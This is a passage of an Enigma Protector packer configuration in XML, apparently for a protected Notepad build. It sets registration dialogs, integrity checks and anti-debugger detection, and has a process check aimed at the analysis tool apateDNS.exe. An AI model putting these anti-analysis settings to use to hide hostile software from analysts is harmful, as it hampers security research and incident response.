J1dHRvbggAAAAeVEVuaWdtYVByb3RlY3RvckxvYWRlckdyb3VwYm94CUdyb3VwYm94MgRMZWZ0AggDVG9wAkAFV2lkdGgD4QEGSGVpZ2h0A5oAB0FuY2hvcnMLBmFrTGVmdAVha1RvcAdha1JpZ2h0CGFrQm90dG9tAAdDYXB0aW9uBhhSZWdpc3RyYXRpb24gSW5mb3JtYXRpb24MRm9udC5DaGFyc2V0Bw9ERUZBVUxUX0NIQVJTRVQKRm9udC5Db2xvcgcMY2xXaW5kb3dUZXh0C0ZvbnQuSGVpZ2h0AvUJRm9udC5OYW1lBg1NUyBTYW5zIFNlcmlmCkZvbnQuU3R5bGULBmZzQm9sZAAKUGFyZW50Rm9udAgIVGFiT3JkZXICAQpEZXNpZ25TaXplAQPhAQOaAAAAG1RFbmlnbWFQcm90ZWN0b3JMb2FkZXJMYWJlbAZMYWJlbDEETGVmdAIIA1RvcAIQBVdpZHRoAhwGSGVpZ2h0Ag0HQ2FwdGlvbgYETmFtZQxGb250LkNoYXJzZXQHD0RFRkFVTFRfQ0hBUlNFVApGb250LkNvbG9yBwxjbFdpbmRvd1RleHQLRm9udC5IZWlnaHQC9QlGb250Lk5hbWUGDU1TIFNhbnMgU2VyaWYKRm9udC5TdHlsZQsAClBhcmVudEZvbnQIAAAbVEVuaWdtYVByb3RlY3RvckxvYWRlckxhYmVsBkxhYmVsMgRMZWZ0AggDVG9wAjgFV2lkdGgCEgZIZWlnaHQCDQdDYXB0aW9uBgNLZXkMRm9udC5DaGFyc2V0Bw9ERUZBVUxUX0NIQVJTRVQKRm9udC5Db2xvcgcMY2xXaW5kb3dUZXh0C0ZvbnQuSGVpZ2h0AvUJRm9udC5OYW1lBg1NUyBTYW5zIFNlcmlmCkZvbnQuU3R5bGULAApQYXJlbnRGb250CAAAGlRFbmlnbWFQcm90ZWN0b3JMb2FkZXJFZGl0BUVkaXQyBExlZnQCCANUb3ACIAVXaWR0aAO7AQZIZWlnaHQCFQdBbmNob3JzCwZha0xlZnQFYWtUb3AHYWtSaWdodAAIVGFiT3JkZXICAAdDb250ZW50BxFjb1JlZ2lzdHJhdGlvTmFtZQ5TaG93Q29weUJ1dHRvbggPU2hvd1Bhc3RlQnV0dG9uCQAAGlRFbmlnbWFQcm90ZWN0b3JMb2FkZXJNZW1vBU1lbW8xBExlZnQCCANUb3ACSAVXaWR0aAO7AQZIZWlnaHQCSgdBbmNob3JzCwZha0xlZnQFYWtUb3AHYWtSaWdodAhha0JvdHRvbQAIVGFiT3JkZXICAQdDb250ZW50BxBjb1JlZ2lzdHJhdGlvS2V5DlNob3dDb3B5QnV0dG9uCA9TaG93UGFzdGVCdXR0b24JAAAAHFRFbmlnbWFQcm90ZWN0b3JMb2FkZXJCdXR0b24HQnV0dG9uMQRMZWZ0AggDVG9wA+MABVdpZHRoA4EABkhlaWdodAIeB0FuY2hvcnMLBmFrTGVmdAhha0JvdHRvbQAHQ2FwdGlvbgYDVHJ5DEZvbnQuQ2hhcnNldAcPREVGQVVMVF9DSEFSU0VUCkZvbnQuQ29sb3IHDGNsV2luZG93VGV4dAtGb250LkhlaWdodAL1CUZvbnQuTmFtZQYNTVMgU2FucyBTZXJpZgpGb250LlN0eWxlCwZmc0JvbGQAClBhcmVudEZvbnQICFRhYk9yZGVyAgILQ2xpY2tBY3Rpb24HCmNhQ29udGludWUAABxURW5pZ21hUHJvdGVjdG9yTG9hZGVyQnV0dG9uB0J1dHRvbjIETGVmdAO4AANUb3AD4wAFV2lkdGgDgQAGSGVpZ2h0Ah4HQW5jaG9ycwsGYWtMZWZ0B2FrUmlnaHQIYWtCb3R0b20AB0NhcHRpb24GCFJlZ2lzdGVyDEZvbnQuQ2hhcnNldAcPREVGQVVMVF9DSEFSU0VUCkZvbnQuQ29sb3IHDGNsV2luZG93VGV4dAtGb250LkhlaWdodAL1CUZvbnQuTmFtZQYNTVMgU2FucyBTZXJpZgpGb250LlN0eWxlCwZmc0JvbGQAClBhcmVudEZvbnQICFRhYk9yZGVyAgMLQ2xpY2tBY3Rpb24HCmNhUmVnaXN0ZXIAABxURW5pZ21hUHJvdGVjdG9yTG9hZGVyQnV0dG9uB0J1dHRvbjMETGVmdANoAQNUb3AD4wAFV2lkdGgDgwAGSGVpZ2h0Ah4HQW5jaG9ycwsHYWtSaWdodAhha0JvdHRvbQAHQ2FwdGlvbgYFQ2xvc2UMRm9udC5DaGFyc2V0Bw9ERUZBVUxUX0NIQVJTRVQKRm9udC5Db2xvcgcMY2xXaW5kb3dUZXh0C0ZvbnQuSGVpZ2h0AvUJRm9udC5OYW1lBg1NUyBTYW5zIFNlcmlmCkZvbnQuU3R5bGULBmZzQm9sZAAKUGFyZW50Rm9udAgIVGFiT3JkZXICBAtDbGlja0FjdGlvbgcGY2FFeGl0AAAA</Form>
      <Enabled>False</Enabled>
      <ShowOnTrialExpire>False</ShowOnTrialExpire>
      <ShowOnUnregistered>True</ShowOnUnregistered>
      <ShowCorrectMessage>False</ShowCorrectMessage>
      <ShowIncorrectMessage>False</ShowIncorrectMessage>
      <MessageCorrect>
        <Title>The Registration Succeeded</Title>
        <Text>Thanks for registration!</Text>
        <UseHL>False</UseHL>
        <HLSentence>The Enigma Protector</HLSentence>
        <HLURL>http://www.enigmaprotector.com/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </MessageCorrect>
      <MessageIncorrect>
        <Title>The Registration did not succeeded</Title>
        <Text>Your registration information is incorrect!</Text>
        <UseHL>False</UseHL>
        <HLSentence>The Enigma Protector</HLSentence>
        <HLURL>http://www.enigmaprotector.com/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </MessageIncorrect>
    </RegistrationDialog>
    <KeyExpirationReminder>
      <Enabled>False</Enabled>
      <DaysBeforeExpiration>30</DaysBeforeExpiration>
      <Message>
        <Title>Registration Key Expiration Reminder</Title>
        <Text>Your registration key will expire in %DaysToKeyExp% days.
Please contact to our support team to obtain new one!
Use the link below to visit our web site.</Text>
        <UseHL>False</UseHL>
        <HLSentence>The Enigma Protector</HLSentence>
        <HLURL>http://enigmaprotector.com/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </Message>
    </KeyExpirationReminder>
    <EncryptWithHardwareID>
      <Enabled>False</Enabled>
      <HardwareID/>
    </EncryptWithHardwareID>
  </RegistrationFeatures>
  <CheckUp>
    <AntiDebugger>
      <Enabled>True</Enabled>
      <ShowMessageBeforeTermination>False</ShowMessageBeforeTermination>
      <Message>
        <Title>Debugger warning</Title>
        <Text>A debugger is detected on this computer.
Applications such as WinIce/SoftIce, OllyDbg, TWD could be executing.
This program will not execute while debuggers are running.</Text>
        <UseHL>False</UseHL>
        <HLSentence>Click here for help</HLSentence>
        <HLURL>http://www.yourcompany.com/help/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </Message>
      <CheckAtRuntime>True</CheckAtRuntime>
    </AntiDebugger>
    <ControlSum>
      <Enabled>True</Enabled>
      <FileIntegrityChecking>True</FileIntegrityChecking>
      <RTIntegrityChecking>True</RTIntegrityChecking>
      <ShowMessageBeforeTermination>False</ShowMessageBeforeTermination>
      <Message>
        <Title>Virus warning</Title>
        <Text>Program integrity check failed.
Please check for viruses on your computer.
If program is not infected, it had been patched
or tampered  - please re-download and re-install.
This program will now close.</Text>
        <UseHL>False</UseHL>
        <HLSentence>Click here for help</HLSentence>
        <HLURL>http://www.yourcompany.com/help/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </Message>
    </ControlSum>
    <StartupPassword>
      <Enabled>False</Enabled>
      <AlwaysAsk>True</AlwaysAsk>
      <AskFirstTime>False</AskFirstTime>
      <AskInDays>False</AskInDays>
      <DaysAfterAsk>30</DaysAfterAsk>
      <HidePassword>True</HidePassword>
      <AllowChange>False</AllowChange>
      <Message>
        <Title>Invalid password</Title>
        <Text>You have entered an invalid startup password.
Try to check it again or contact the software developers:</Text>
        <UseHL>False</UseHL>
        <HLSentence>Click here for registration</HLSentence>
        <HLURL>http://www.yourcompany.com/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </Message>
      <Passwords Count="0"/>
    </StartupPassword>
    <FileName>
      <Enabled>False</Enabled>
      <OriginalFileName>notepad_protected.exe</OriginalFileName>
      <ShowMessageBeforeTermination>True</ShowMessageBeforeTermination>
      <Message>
        <Title>Invalid File Name</Title>
        <Text>The software&apos;s file name had been changed.
Please restore the original file name.
This program will now close.</Text>
        <UseHL>False</UseHL>
        <HLSentence>Press here to download official version!</HLSentence>
        <HLURL>http://www.yourcompany.com/downloads/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </Message>
    </FileName>
    <DiskDrive>
      <Enabled>False</Enabled>
      <Selection>
        <Removable>True</Removable>
        <Fixed>True</Fixed>
        <Remote>True</Remote>
        <CDROM>True</CDROM>
        <RAMDisk>True</RAMDisk>
      </Selection>
      <ShowMessageBeforeTermination>True</ShowMessageBeforeTermination>
      <Message>
        <Title>Invalid drive type</Title>
        <Text>The software has checked impossible disk drive type!
Try to contact to developers or download newest version of this software at:</Text>
        <UseHL>False</UseHL>
        <HLSentence>Click here for newest version!</HLSentence>
        <HLURL>http://www.yourcompany.com/downloads/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </Message>
    </DiskDrive>
    <ExecutedCopies>
      <Enabled>False</Enabled>
      <AllowCopies>1</AllowCopies>
      <ShowMessageIfCopiesCountIsExceeded>True</ShowMessageIfCopiesCountIsExceeded>
      <Message>
        <Title>Warning</Title>
        <Text>You have exceeded maximal number of executed copies.
Application won&apos;t be started.</Text>
        <UseHL>False</UseHL>
        <HLSentence>Software information</HLSentence>
        <HLURL>http://www.yourcompany.com/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </Message>
      <TerminateExecution>True</TerminateExecution>
    </ExecutedCopies>
    <UserLanguage>
      <Enabled>False</Enabled>
      <ALB>True</ALB>
      <DZA>True</DZA>
      <ARG>True</ARG>
      <ARM>True</ARM>
      <AUS>True</AUS>
      <AUT>True</AUT>
      <AZE>True</AZE>
      <BHR>True</BHR>
      <BLR>True</BLR>
      <BEL>True</BEL>
      <BLZ>True</BLZ>
      <BOL>True</BOL>
      <BRA>True</BRA>
      <BRN>True</BRN>
      <BGR>True</BGR>
      <KHM>True</KHM>
      <CAN>True</CAN>
      <CAF>True</CAF>
      <TCD>True</TCD>
      <CHL>True</CHL>
      <CHN>True</CHN>
      <COL>True</COL>
      <CRI>True</CRI>
      <HRV>True</HRV>
      <CZE>True</CZE>
      <DNK>True</DNK>
      <DOM>True</DOM>
      <ECU>True</ECU>
      <EGY>True</EGY>
      <SLV>True</SLV>
      <EST>True</EST>
      <FRO>True</FRO>
      <FIN>True</FIN>
      <FRA>True</FRA>
      <GEO>True</GEO>
      <DEU>True</DEU>
      <GRC>True</GRC>
      <GTM>True</GTM>
      <HND>True</HND>
      <HKG>True</HKG>
      <HUN>True</HUN>
      <ISL>True</ISL>
      <IND>True</IND>
      <IDN>True</IDN>
      <IRN>True</IRN>
      <IRQ>True</IRQ>
      <IRL>True</IRL>
      <ISR>True</ISR>
      <ITA>True</ITA>
      <JAM>True</JAM>
      <JPN>True</JPN>
      <JOR>True</JOR>
      <KAZ>True</KAZ>
      <KEN>True</KEN>
      <PRK>True</PRK>
      <KOR>True</KOR>
      <KWT>True</KWT>
      <KGZ>True</KGZ>
      <LVA>True</LVA>
      <LBN>True</LBN>
      <LBR>True</LBR>
      <LIE>True</LIE>
      <LTU>True</LTU>
      <LUX>True</LUX>
      <MAC>True</MAC>
      <MKD>True</MKD>
      <MYS>True</MYS>
      <MEX>True</MEX>
      <MDA>True</MDA>
      <MCO>True</MCO>
      <MNG>True</MNG>
      <MAR>True</MAR>
      <NLD>True</NLD>
      <NZL>True</NZL>
      <NIC>True</NIC>
      <NOR>True</NOR>
      <OMN>True</OMN>
      <PAK>True</PAK>
      <PAN>True</PAN>
      <PRY>True</PRY>
      <PER>True</PER>
      <PHL>True</PHL>
      <POL>True</POL>
      <PRT>True</PRT>
      <PRI>True</PRI>
      <QAT>True</QAT>
      <ROU>True</ROU>
      <RUS>True</RUS>
      <SAU>True</SAU>
      <SCG>True</SCG>
      <SGP>True</SGP>
      <SVK>True</SVK>
      <SVN>True</SVN>
      <ZAF>True</ZAF>
      <ESP>True</ESP>
      <SWE>True</SWE>
      <CHE>True</CHE>
      <TJK>True</TJK>
      <THA>True</THA>
      <TTO>True</TTO>
      <TUN>True</TUN>
      <TUR>True</TUR>
      <TWN>True</TWN>
      <UKR>True</UKR>
      <ARE>True</ARE>
      <GBR>True</GBR>
      <USA>True</USA>
      <URY>True</URY>
      <UZB>True</UZB>
      <VEN>True</VEN>
      <VNM>True</VNM>
      <YEM>True</YEM>
      <ZWE>True</ZWE>
      <AFG>True</AFG>
      <BGD>True</BGD>
      <BIH>True</BIH>
      <CAR>True</CAR>
      <ETH>True</ETH>
      <GRL>True</GRL>
      <LAO>True</LAO>
      <LBY>True</LBY>
      <MDV>True</MDV>
      <MLT>True</MLT>
      <MNE>True</MNE>
      <NEP>True</NEP>
      <NGA>True</NGA>
      <ROM>True</ROM>
      <RWA>True</RWA>
      <SEN>True</SEN>
      <SRB>True</SRB>
      <LKA>True</LKA>
      <SYR>True</SYR>
      <TAJ>True</TAJ>
      <TKM>True</TKM>
      <ShowMessageBeforeTermination>True</ShowMessageBeforeTermination>
      <Message>
        <Title>Warning</Title>
        <Text>You have not permissions to start this application!
Please, contact to developers.</Text>
        <UseHL>False</UseHL>
        <HLSentence>Software information</HLSentence>
        <HLURL>http://www.yourcompany.com/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </Message>
    </UserLanguage>
    <ExternalFiles>
      <Enabled>False</Enabled>
      <ShowMessageBeforeTermination>True</ShowMessageBeforeTermination>
      <Message>
        <Title>Warning</Title>
        <Text>The installation package had been modified!
File: %CU_EXTFILES% is corrupted!
Please reinstall application!</Text>
        <UseHL>False</UseHL>
        <HLSentence>Enigma Protector</HLSentence>
        <HLURL>http://www.enigmaprotector.com/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </Message>
      <Files/>
    </ExternalFiles>
    <ExecutedProcesses>
      <Enabled>True</Enabled>
      <ShowMessageBeforeTermination>False</ShowMessageBeforeTermination>
      <Message>
        <Title>Warning</Title>
        <Text>Spyware tool is executed on this PC.
Please close the application %CU_EXECPR% try again!</Text>
        <UseHL>False</UseHL>
        <HLSentence>Enigma Protector</HLSentence>
        <HLURL>http://www.enigmaprotector.com/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </Message>
      <CheckEndless>True</CheckEndless>
      <CheckDelay>10</CheckDelay>
      <CheckHiddenProcess>False</CheckHiddenProcess>
      <Processes Count="1">
        <Process>
          <Action>1</Action>
          <FileName>apateDNS.exe</FileName>
          <WindowText/>
          <WindowClass/>
          <FileNameCondition>0</FileNameCondition>
          <WindowTextCondition>2</WindowTextCondition>
          <WindowClassCondition>2</WindowClassCondition>
        </Process>
      </Processes>
    </ExecutedProcesses>
    <LoadedDrivers>
      <Enabled>False</Enabled>
      <ShowMessageBeforeTermination>False</ShowMessageBeforeTermination>
      <Message>
        <Title>Warning</Title>
        <Text>Spyware tool is executed on this PC.
Please close this tool try again!</Text>
        <UseHL>False</UseHL>
        <HLSentence>Enigma Protector</HLSentence>
        <HLURL>http://www.enigmaprotector.com/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </Message>
      <Drivers Count="0"/>
    </LoadedDrivers>
    <InstalledServices>
      <Enabled>False</Enabled>
      <ShowMessageBeforeTermination>True</ShowMessageBeforeTermination>
      <Message>
        <Title>Warning</Title>
        <Text>Spyware tool is installed on this PC.
Uninstall service &quot;%CU_INSTSERV%&quot; and try again!</Text>
        <UseHL>False</UseHL>
        <HLSentence>Enigma Protector</HLSentence>
        <HLURL>http://www.enigmaprotector.com/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </Message>
      <Services Count="0"/>
    </InstalledServices>
    <WindowsVersion>
      <Enabled>False</Enabled>
      <WIN_VER_WINDOWS95>False</WIN_VER_WINDOWS95>
      <WIN_VER_WINDOWS95OSR2>False</WIN_VER_WINDOWS95OSR2>
      <WIN_VER_WINDOWS98>False</WIN_VER_WINDOWS98>
      <WIN_VER_WINDOWS98SE>False</WIN_VER_WINDOWS98SE>
      <WIN_VER_WINDOWSME>False</WIN_VER_WINDOWSME>
      <WIN_VER_WINDOWS2000>False</WIN_VER_WINDOWS2000>
      <WIN_VER_WINDOWS2000PROF>False</WIN_VER_WINDOWS2000PROF>
      <WIN_VER_WINDOWS2000DATASERVER>False</WIN_VER_WINDOWS2000DATASERVER>
      <WIN_VER_WINDOWS2000ADVSERVER>False</WIN_VER_WINDOWS2000ADVSERVER>
      <WIN_VER_WINDOWS2000SERVER>False</WIN_VER_WINDOWS2000SERVER>
      <WIN_VER_WINDOWSXP>False</WIN_VER_WINDOWSXP>
      <WIN_VER_WINDOWSXPHOME>False</WIN_VER_WINDOWSXPHOME>
      <WIN_VER_WINDOWSXPPROF>False</WIN_VER_WINDOWSXPPROF>
      <WIN_VER_WINDOWSXPPROFx64>False</WIN_VER_WINDOWSXPPROFx64>
      <WIN_VER_WINDOWSXPPROFDATACENTERx64>False</WIN_VER_WINDOWSXPPROFDATACENTERx64>
      <WIN_VER_WINDOWSXPPROFENERPRICEx64>False</WIN_VER_WINDOWSXPPROFENERPRICEx64>
      <WIN_VER_WINDOWSXPPROFSTANDARTx64>False</WIN_VER_WINDOWSXPPROFSTANDARTx64>
      <WIN_VER_WINDOWS2003SERVER>False</WIN_VER_WINDOWS2003SERVER>
      <WIN_VER_WINDOWS2003SERVERR2>False</WIN_VER_WINDOWS2003SERVERR2>
      <WIN_VER_WINDOWS2003STORAGESERVER>False</WIN_VER_WINDOWS2003STORAGESERVER>
      <WIN_VER_WINDOWS2003DATACENTERITANIUM>False</WIN_VER_WINDOWS2003DATACENTERITANIUM>
      <WIN_VER_WINDOWS2003ENTERPRICEITANIUM>False</WIN_VER_WINDOWS2003ENTERPRICEITANIUM>
      <WIN_VER_WINDOWS2003DATACENTERx64>False</WIN_VER_WINDOWS2003DATACENTERx64>
      <WIN_VER_WINDOWS2003ENERPRICEx64>False</WIN_VER_WINDOWS2003ENERPRICEx64>
      <WIN_VER_WINDOWS2003STANDARTx64>False</WIN_VER_WINDOWS2003STANDARTx64>
      <WIN_VER_WINDOWS2003COMPUTE>False</WIN_VER_WINDOWS2003COMPUTE>
      <WIN_VER_WINDOWS2003DATACENTER>False</WIN_VER_WINDOWS2003DATACENTER>
      <WIN_VER_WINDOWS2003ENTERPRICE>False</WIN_VER_WINDOWS2003ENTERPRICE>
      <WIN_VER_WINDOWS2003WEB>False</WIN_VER_WINDOWS2003WEB>
      <WIN_VER_WINDOWS2003STANDART>False</WIN_VER_WINDOWS2003STANDART>
      <WIN_VER_WINDOWSVISTA>False</WIN_VER_WINDOWSVISTA>
      <WIN_VER_WINDOWSVISTA_BUSINESS>False</WIN_VER_WINDOWSVISTA_BUSINESS>
      <WIN_VER_WINDOWSVISTA_CLUSTER_SERVER>False</WIN_VER_WINDOWSVISTA_CLUSTER_SERVER>
      <WIN_VER_WINDOWSVISTA_DATACENTER_SERVER>False</WIN_VER_WINDOWSVISTA_DATACENTER_SERVER>
      <WIN_VER_WINDOWSVISTA_DATACENTER_SERVER_CORE>False</WIN_VER_WINDOWSVISTA_DATACENTER_SERVER_CORE>
      <WIN_VER_WINDOWSVISTA_DATACENTER_SERVER_CORE_V>False</WIN_VER_WINDOWSVISTA_DATACENTER_SERVER_CORE_V>
      <WIN_VER_WINDOWSVISTA_DATACENTER_SERVER_V>False</WIN_VER_WINDOWSVISTA_DATACENTER_SERVER_V>
      <WIN_VER_WINDOWSVISTA_ENTERPRICE>False</WIN_VER_WINDOWSVISTA_ENTERPRICE>
      <WIN_VER_WINDOWSVISTA_ENTERPRISE_SERVER>False</WIN_VER_WINDOWSVISTA_ENTERPRISE_SERVER>
      <WIN_VER_WINDOWSVISTA_ENTERPRISE_SERVER_CORE>False</WIN_VER_WINDOWSVISTA_ENTERPRISE_SERVER_CORE>
      <WIN_VER_WINDOWSVISTA_ENTERPRISE_SERVER_V>False</WIN_VER_WINDOWSVISTA_ENTERPRISE_SERVER_V>
      <WIN_VER_WINDOWSVISTA_ENTERPRISE_SERVER_CORE_V>False</WIN_VER_WINDOWSVISTA_ENTERPRISE_SERVER_CORE_V>
      <WIN_VER_WINDOWSVISTA_ENTERPRISE_SERVER_IA64>False</WIN_VER_WINDOWSVISTA_ENTERPRISE_SERVER_IA64>
      <WIN_VER_WINDOWSVISTA_HOME_BASIC>False</WIN_VER_WINDOWSVISTA_HOME_BASIC>
      <WIN_VER_WINDOWSVISTA_HOME_PREMIUM>False</WIN_VER_WINDOWSVISTA_HOME_PREMIUM>
      <WIN_VER_WINDOWSVISTA_HOME_SERVER>False</WIN_VER_WINDOWSVISTA_HOME_SERVER>
      <WIN_VER_WINDOWSVISTA_SERVER_FOR_SMALLBUSINESS>False</WIN_VER_WINDOWSVISTA_SERVER_FOR_SMALLBUSINESS>
      <WIN_VER_WINDOWSVISTA_SMALLBUSINESS_SERVER>False</WIN_VER_WINDOWSVISTA_SMALLBUSINESS_SERVER>
      <WIN_VER_WINDOWSVISTA_SMALLBUSINESS_SERVER_PREMIUM>False</WIN_VER_WINDOWSVISTA_SMALLBUSINESS_SERVER_PREMIUM>
      <WIN_VER_WINDOWSVISTA_MEDIUMBUSINESS_SERVER_MANAGEMENT>False</WIN_VER_WINDOWSVISTA_MEDIUMBUSINESS_SERVER_MANAGEMENT>
      <WIN_VER_WINDOWSVISTA_MEDIUMBUSINESS_SERVER_MESSAGING>False</WIN_VER_WINDOWSVISTA_MEDIUMBUSINESS_SERVER_MESSAGING>
      <WIN_VER_WINDOWSVISTA_MEDIUMBUSINESS_SERVER_SECURITY>False</WIN_VER_WINDOWSVISTA_MEDIUMBUSINESS_SERVER_SECURITY>
      <WIN_VER_WINDOWSVISTA_STANDARD_SERVER>False</WIN_VER_WINDOWSVISTA_STANDARD_SERVER>
      <WIN_VER_WINDOWSVISTA_STANDARD_SERVER_V>False</WIN_VER_WINDOWSVISTA_STANDARD_SERVER_V>
      <WIN_VER_WINDOWSVISTA_STANDARD_SERVER_CORE>False</WIN_VER_WINDOWSVISTA_STANDARD_SERVER_CORE>
      <WIN_VER_WINDOWSVISTA_STANDARD_SERVER_CORE_V>False</WIN_VER_WINDOWSVISTA_STANDARD_SERVER_CORE_V>
      <WIN_VER_WINDOWSVISTA_STARTER>False</WIN_VER_WINDOWSVISTA_STARTER>
      <WIN_VER_WINDOWSVISTA_STORAGE_ENTERPRISE_SERVER>False</WIN_VER_WINDOWSVISTA_STORAGE_ENTERPRISE_SERVER>
      <WIN_VER_WINDOWSVISTA_STORAGE_EXPRESS_SERVER>False</WIN_VER_WINDOWSVISTA_STORAGE_EXPRESS_SERVER>
      <WIN_VER_WINDOWSVISTA_STORAGE_STANDARD_SERVER>False</WIN_VER_WINDOWSVISTA_STORAGE_STANDARD_SERVER>
      <WIN_VER_WINDOWSVISTA_STORAGE_WORKGROUP_SERVER>False</WIN_VER_WINDOWSVISTA_STORAGE_WORKGROUP_SERVER>
      <WIN_VER_WINDOWSVISTA_UNDEFINED>False</WIN_VER_WINDOWSVISTA_UNDEFINED>
      <WIN_VER_WINDOWSVISTA_ULTIMATE>False</WIN_VER_WINDOWSVISTA_ULTIMATE>
      <WIN_VER_WINDOWSVISTA_WEB_SERVER>False</WIN_VER_WINDOWSVISTA_WEB_SERVER>
      <WIN_VER_WINDOWSVISTA_WEB_SERVER_CORE>False</WIN_VER_WINDOWSVISTA_WEB_SERVER_CORE>
      <WIN_VER_WINDOWSVISTA_UNLICENSED>False</WIN_VER_WINDOWSVISTA_UNLICENSED>
      <WIN_VER_WINDOWS2008>False</WIN_VER_WINDOWS2008>
      <WIN_VER_WINDOWS2008_BUSINESS>False</WIN_VER_WINDOWS2008_BUSINESS>
      <WIN_VER_WINDOWS2008_CLUSTER_SERVER>False</WIN_VER_WINDOWS2008_CLUSTER_SERVER>
      <WIN_VER_WINDOWS2008_DATACENTER_SERVER>False</WIN_VER_WINDOWS2008_DATACENTER_SERVER>
      <WIN_VER_WINDOWS2008_DATACENTER_SERVER_CORE>False</WIN_VER_WINDOWS2008_DATACENTER_SERVER_CORE>
      <WIN_VER_WINDOWS2008_DATACENTER_SERVER_CORE_V>False</WIN_VER_WINDOWS2008_DATACENTER_SERVER_CORE_V>
